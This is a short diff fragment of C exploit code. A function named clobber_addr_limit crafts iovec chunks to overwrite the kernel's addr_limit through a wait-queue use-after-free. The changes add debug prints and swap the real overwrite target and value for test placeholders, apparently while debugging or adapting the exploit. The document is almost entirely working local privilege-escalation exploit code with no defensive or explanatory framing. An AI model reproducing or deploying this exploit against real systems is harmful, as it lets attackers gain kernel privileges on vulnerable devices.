@@ -171,12 +171,14 @@ void clobber_addr_limit(void)
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
   memset(iovec_array, 0, sizeof(iovec_array));
   
+  printf("current_ptr = %lx\n", current_ptr);
+  
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
     sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
     &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
-    8, /* next iov_len (sizeof(addr_limit)) */
-    (unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    1, /* next iov_len (sizeof(addr_limit)) */
+    &testDatum2, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   memcpy(testFill, second_write_chunk, sizeof(second_write_chunk));
@@ -184,7 +186,7 @@ void clobber_addr_limit(void)
   printf("offset %lx\n", sizeof(testFill));
   unsigned long third_write_chunk[] = {
     0xfffffffffffffffe, /* value to write over addr_limit */
-    0xfffffffffffffffe, /* value to write over addr_limit */
+    0xABCDEF0123456789, /* value to write over addr_limit */
   };
   
   int initialSize = 4096*17 - UAF_SPINLOCK-sizeof(testFill);
